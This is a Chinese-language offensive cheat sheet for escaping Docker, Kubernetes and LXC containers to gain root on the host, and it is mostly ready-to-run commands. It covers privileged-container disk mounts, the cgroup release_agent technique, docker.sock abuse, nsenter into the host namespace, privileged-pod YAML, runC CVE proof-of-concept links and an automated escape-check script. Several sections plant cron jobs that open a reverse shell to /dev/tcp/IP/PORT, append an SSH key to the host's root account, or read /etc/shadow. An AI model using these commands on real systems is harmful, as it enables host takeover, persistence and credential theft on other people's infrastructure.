# Container Escape — 容器逃逸快速手册

> 当 `ls -la /.dockerenv` 返回文件存在时，所有前面的 Linux PE 技术都不完整——你还需要逃逸容器。容器逃逸的关键入口：Privileged 容器、Docker Socket 暴露、危险 Capability、共享内核 exploit。

## 关键词

`容器逃逸` `container escape` `docker` `docker.sock` `privileged` `--privileged` `cgroup` `release_agent` `cap_sys_admin` `cap_sys_ptrace` `nsenter` `挂载逃逸` `lxc` `lxd` `kubectl` `kubernetes` `pod逃逸` `runc` `CVE-2019-5736` `runc逃逸` `CVE-2022-0492` `CVE-2021-30465`

---

## 1. 环境判定

### 1.1 是否在容器内

```bash
# 确认标志
ls -la /.dockerenv 2>/dev/null           # Docker 容器标志文件
cat /proc/1/cgroup | grep -i "docker\|kubepods\|lxc"  # cgroup 指示
cat /proc/1/environ | tr '\0' '\n'       # 环境变量

# 容器类型
cat /proc/self/status | grep -i "seccomp"
# docker → /usr/bin/containerd
# k8s → /pause (PID 1)

# 如果输出包含 docker/kube → 确认在容器内
```

### 1.2 能力盘点

```bash
# 当前容器的能力
capsh --print 2>/dev/null
cat /proc/1/status | grep CapEff  # 十六进制 capability 位掩码

# 关键检查清单:
# [ ] --privileged? (capsh --print 显示大量 cap)
# [ ] /var/run/docker.sock 存在?
# [ ] /proc/1/root 可访问?
# [ ] 宿主磁盘已挂载?
# [ ] CAP_SYS_ADMIN?
# [ ] CAP_SYS_PTRACE?
# [ ] CAP_NET_RAW?
# [ ] seccomp disabled? (cat /proc/1/status|grep Seccomp → 0)
# [ ] AppArmor disabled? (/proc/1/attr/current → unconfined)
```

---

## 2. Privileged 容器逃逸

### 2.1 直接挂载宿主磁盘

```bash
# privileged 容器可以访问所有块设备
# 1. 查看磁盘
fdisk -l
lsblk

# 2. 挂载宿主根文件系统
mount /dev/sda1 /mnt
# 或
mount /dev/vda1 /mnt

# 3. 访问宿主文件系统
chroot /mnt /bin/bash
# → 宿主机的 root shell

# 4. 后门方式 — 写入 crontab
echo '* * * * * root bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"' >> /mnt/etc/crontab

# 5. 写 SSH key
echo "ssh-rsa AAA..." >> /mnt/root/.ssh/authorized_keys
```

### 2.2 cgroup release_agent（如果无法 mount 磁盘）

```bash
# 前提: CAP_SYS_ADMIN (privileged 容器必有)
# 通过 cgroup 的 release_agent 在宿主执行命令

# 1. 创建临时 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. 设置 release_agent
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. 写命令脚本（会以 root 在宿主执行）
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /cmd
chmod +x /cmd

# 4. 触发
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# → 宿主反弹 shell
```

---

## 3. Docker Socket 暴露

### 3.1 发现

```bash
# docker.sock 是 Docker API 的 Unix socket
ls -la /var/run/docker.sock 2>/dev/null
# 或检查环境变量
env | grep DOCKER

# 如果存在 → 可以在容器内创建新容器
docker -H unix:///var/run/docker.sock ps   # 列宿主容器
```

### 3.2 利用 docker.sock

```bash
# 方法 1: 运行一个新容器挂载宿主 /
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/bash

# 方法 2: 创建 privileged 容器
docker -H unix:///var/run/docker.sock run --privileged -it --pid=host --net=host --rm alpine nsenter -t 1 -m -u -i -n -p -- /bin/bash

# 方法 3: 利用 curl 直接调 Docker API
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","/bin/sh"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/containers/create

# 方法 4: 写 crontab 到宿主（如果知道路径）
echo '* * * * * root bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"' > /host/etc/cron.d/pwn
# 通过 docker cp 或挂载传递
```

---

## 4. Capability 逃逸

### 4.1 CAP_SYS_ADMIN（最危险）

```bash
# 多种逃逸路径
# A: cgroup release_agent (见 2.2)
# B: mount 宿主文件系统
# C: unshare → 创建新 namespace → 突破

# B: 需要确认哪些设备可挂载
fdisk -l 2>/dev/null
# 如果能看见宿主磁盘 → mount + chroot (见 2.1)

# D: 如果是 LXC:
# lxc exec host -- /bin/bash  (如果在 lxc 组)
```

### 4.2 CAP_SYS_PTRACE

```bash
# 可注入宿主进程
# 工具: https://github.com/0x00pf/p0wnedShell
# 找到宿主进程 PID:
ps aux | grep -v grep | grep -v $$
# 注入:
./inject <HOST_PID>
```

### 4.3 CAP_NET_RAW

```bash
# 可以发包 → 但一般不能直接逃逸
# 可用于: 扫描宿主网络、ARP 欺骗、DNS 劫持
```

### 4.4 CAP_DAC_READ_SEARCH

```bash
# 可读宿主文件系统（如果知道路径）
# 读宿主的 /etc/shadow
cat /proc/1/root/etc/shadow  # 如果 proc 未隔离
```

---

## 5. 暴露的 proc/sys

### 5.1 /proc 访问

```bash
# 如果 /proc 未 namespace 隔离 → 可以看到宿主进程
ls /proc | grep -E '^[0-9]+$'

# 如果能看到 PID 1 且不是容器 init:
cat /proc/1/cmdline  # 宿主 init (systemd/init)
nsenter -t 1 -m -u -i -n -p -- /bin/bash  # 进入宿主 namespace!
```

### 5.2 /sys 暴露

```bash
# 可写 /sys → 修改内核参数
# 但不直接等于逃逸

# 如果 /sys/fs/cgroup 可写
# → cgroup release_agent 逃逸 (见 2.2)
```

---

## 6. 内核漏洞共享逃逸

### 6.1 原理

```
容器与宿主机共用同一个 Linux 内核。
如果容器能执行任意代码（哪怕是受限用户），
并且内核存在某个可本地提权的 CVE，
则可以在容器内触发该 CVE 获得宿主机 ring 0 执行。
```

### 6.2 判断

```bash
# 容器内 uname -a → 内核版本
# 这个版本就是宿主机的内核版本!

# 走标准 Linux 内核 CVE 流程:
# 见 03-linux-kernel-cve.md
# 重点: DirtyPipe, PwnKit, OverlayFS, Netfilter
```

### 6.3 CVE-2022-0492 (cgroup escape 专用)

```bash
# 如果内核 5.4 ~ 5.16 + 容器有 CAP_SYS_ADMIN
# 且 seccomp 未过滤 unshare 和 mount:
unshare -UrmC bash  # 创建新 namespace
mount -t cgroup -o memory cgroup /tmp/cgrp
# → cgroup release_agent 逃逸 (见 2.2)
```

---

## 7. LXC/LXD 组逃逸

```bash
# 如果在 lxc/lxd 组
id | grep lxd

# 方法 1: lxc exec
lxc exec host -- /bin/bash

# 方法 2: 创建 privileged 容器
lxc init ubuntu:20.04 test -c security.privileged=true
lxc config device add test host-root disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test -- /bin/bash
# → /mnt/root 是宿主根目录
```

---

## 8. runC 容器逃逸 CVE 全集

### 8.1 CVE-2025-31133 / 52565 / 52881 (2025.11 三大新漏洞)

```bash
# 三个 runC 漏洞影响 Docker/Kubernetes/containerd/CRI-O 全系
# 攻击者需能启动自定义挂载配置的容器（恶意镜像/Dockerfile 即可）

# ====== CVE-2025-31133: maskedPaths symlink 滥用 ======
# 类型: 符号链接竞争 → 逃逸 maskedPaths 限制 → 挂载宿主路径
# 影响: 所有 runC 版本
# 修复: runC 1.2.8 / 1.3.3 / 1.4.0-rc.3

# ====== CVE-2025-52565: /dev/console 挂载竞争 ======
# 类型: 容器 init 期间的竞争条件 → /dev/console → 宿主路径穿透
# 影响: runC ≥ 1.0.0-rc3
# 修复: 同上

# ====== CVE-2025-52881: LSM 绕过 + /proc 写 gadget ======
# 类型: 绕过 AppArmor/SELinux → 写 /proc/sys/kernel/core_pattern → 执行命令
# 影响: 所有 runC 版本（无有效 LSM 保护的系统）
# 修复: 同上

# ====== 检测 ======
runc --version
# 版本 < 1.2.8 / 1.3.3 / 1.4.0-rc.3 → 受影响

# ====== 缓解 ======
# 1. 升级 runC（！首选）
# 2. 启用 user namespaces（阻断 /proc 访问）
# 3. 使用 rootless 容器
# 4. 严格执行 Pod Security Standards
```

### 8.2 Dirty Frag on Kubernetes (CVE-2026-43284, 2026.05)

```bash
# PoC: 普通非特权 Pod → 节点级代码执行 (Amazon EKS)
# https://github.com/Percivalll/Dirty-Frag-Kubernetes-PoC

# 原理链:
# 1. 攻击者 Pod 向共享镜像层中的二进制 page cache 写入 dirty page
# 2. 特权 DaemonSet (如 kube-proxy) 执行该二进制
# 3. 以节点级权限触发恶意代码 → node root

# 前提: 共享镜像层 + user namespace 开启 (CLONE_NEWUSER → CAP_NET_ADMIN)
# 缓解: 打内核补丁, 禁用 esp4/esp6 模块, seccomp 限制
```

### 8.3 CVE-2019-5736 (经典! 迄今影响广)

```bash
# runc < 1.0-rc6 存在此漏洞
# 原理: 在容器内覆盖 /proc/self/exe (即宿主的 runc 二进制)
# → 下次宿主执行 runc (如 docker exec) 时运行恶意代码

# 检测
runc --version
docker-runc --version 2>/dev/null

# 利用: https://github.com/Frichetten/CVE-2019-5736-PoC
# 编译 Go exploit → 上传到容器 → 执行
# 目标: 下次 docker exec → runc 被覆盖 → 执行恶意 payload → root shell
```

---

## 9. Kubernetes 特有条件

```bash
# ====== 高权限 ServiceAccount ======
kubectl auth can-i --list
# 如果可 create pods:
kubectl apply -f - << EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    securityContext:
      privileged: true
  hostPID: true
  hostNetwork: true
  hostIPC: true
EOF
# → kubectl exec -it escape -- /bin/bash → 宿主 shell

# ====== 读取 secrets ======
kubectl get secrets -o yaml
kubectl describe pod <pod-name> | grep -A5 "Environment"
```

---

## 10. 一键自动化：Container Escape 探测脚本

```bash
#!/bin/bash
# esc-check.sh — 容器逃逸面快速评估
# 上传到容器内执行

RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
echo "=== Container Detection ==="
[ -f /.dockerenv ] && echo -e "${RED}[!] Docker 容器${NC}"
grep -qE 'docker|kubepods|lxc' /proc/1/cgroup 2>/dev/null && echo -e "${RED}[!] cgroup 确认容器环境${NC}"

echo -e "\n=== Privileged? ==="
grep -q 0000003fffffffff /proc/1/status 2>/dev/null && echo -e "${RED}[!] Privileged 容器 (全 cap)${NC}"
capsh --print 2>/dev/null | grep cap_sys_admin && echo -e "${RED}[!] CAP_SYS_ADMIN — cgroup release_agent 逃逸可用${NC}"
capsh --print 2>/dev/null | grep cap_sys_ptrace && echo -e "${RED}[!] CAP_SYS_PTRACE — 宿主进程注入可用${NC}"

echo -e "\n=== Docker Socket ==="
[ -S /var/run/docker.sock ] && echo -e "${RED}[!] docker.sock → docker run -v /:/host alpine chroot /host${NC}"

echo -e "\n=== Host Disk Access ==="
lsblk 2>/dev/null | grep -E 'sd|vd|nvme' && echo -e "${GREEN}[*] 块设备可见 → 尝试 mount 宿主机磁盘${NC}"
mount | grep -E '/host|/mnt.*host' && echo -e "${RED}[!] 宿主机文件系统已挂载${NC}"

echo -e "\n=== PID Namespace ==="
nsenter --help >/dev/null 2>&1 && echo -e "${GREEN}[*] nsenter 可用${NC}"
pid_count=$(ls /proc | grep -E '^[0-9]+$' | wc -l)
[ "$pid_count" -gt 50 ] && echo -e "${RED}[!] PID namespace 未隔离 (${pid_count} 进程可见) → nsenter -t 1 -a /bin/bash${NC}"

echo -e "\n=== Capabilities ==="
getcap -r / 2>/dev/null | head -20

echo -e "\n=== LXC/LXD ==="
id 2>/dev/null | grep -q lxd && echo -e "${RED}[!] LXD 组成员 → lxc exec host /bin/bash${NC}"

echo -e "\n=== Kernel CVE (容器内可打) ==="
uname -a
grep -qE 'DirtyPipe|DirtyCow' /proc/version 2>/dev/null && echo -e "${GREEN}[*] 可能受影响 → 走 03-linux-kernel-cve.md${NC}"

echo -e "\n=== runC Version ==="
runc --version 2>/dev/null || docker-runc --version 2>/dev/null

echo -e "\n=== Seccomp / AppArmor ==="
grep Seccomp /proc/1/status 2>/dev/null
cat /proc/1/attr/current 2>/dev/null

echo -e "\n=== Mount Flags ==="
mount | grep -E '(rw.*proc|sys|cgroup)' | head -10
```

```yaml
# 如果上面的脚本输出:
# Privileged 容器 + CAP_SYS_ADMIN → 立即走 cgroup release_agent:
#
# mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
# mkdir /tmp/cgrp/x
# echo 1 > /tmp/cgrp/x/notify_on_release
# host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# echo "$host_path/cmd" > /tmp/cgrp/release_agent
# echo '#!/bin/sh' > /cmd
# echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /cmd
# chmod +x /cmd
# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# → 宿主机反弹 shell!

# 如果 docker.sock → 立即:
# docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/bash
```

## 11. 关联技术

- [[00-overview]] — PE 全景
- [[03-linux-kernel-cve]] — 内核 CVE（容器内可用）
- [[01-linux-sudo-suid]] — SUID/SUDO
- [[kubernetes-container]] — Kubernetes 容器安全（另见）
